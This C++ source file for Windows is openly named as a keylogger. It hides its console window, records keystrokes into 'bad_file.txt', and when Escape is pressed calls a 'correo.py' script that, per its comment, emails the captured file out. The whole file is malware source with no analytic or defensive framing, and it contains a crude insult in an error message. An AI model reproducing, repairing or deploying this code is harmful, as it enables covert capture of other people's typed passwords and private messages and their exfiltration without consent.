#include <iostream>
#include <Windows.h>
#include <string>
#include <fstream>
#include <conio.h>
#include <windows.h>
using namespace std;

//**************** Clase Principal **************** 

class Keylogger
{
	private:
		string line_;
		bool end_process;
		ofstream bad_file;
		public:
			Keylogger()
			{
				this->line_ = "";
				this->end_process = false;
			}

			void Capture_Keys()
			{
				this->bad_file.open("bad_file.txt", ios::app);
				if(this->bad_file.fail())
				{
					cout << "Error pendejo!" << endl;
				}
				else
				{
					do
					{
						//		We create bucle that loop to repeat as long as 27 is not pressed
						if(kbhit()) // if pressed a key save the key in a char 
						{
							char tecla = getch();
							if(tecla == 27) // if key is 'escape' the bucle 'while' terminate whill finish
							{
								this->end_process = true;
								system("correo.py"); // open file by send 'bad_file' to email
							}
							else
							{
								// We pass everybody key to 'string: line'
								this->line_ += tecla;
								if(this->line_.length() > 50 || tecla == 32 || tecla == 13) // if size is greater than 50 
								{
									//write line in file and emptied line
									this->bad_file << this->line_ << endl;
									this->line_ = "";
								}
							}
						}

					}while(!this->end_process);
					this->bad_file.close();
				}
			}
};

int main()
{
	FreeConsole();
	Keylogger x;
	x.Capture_Keys();
	system("pause");
}


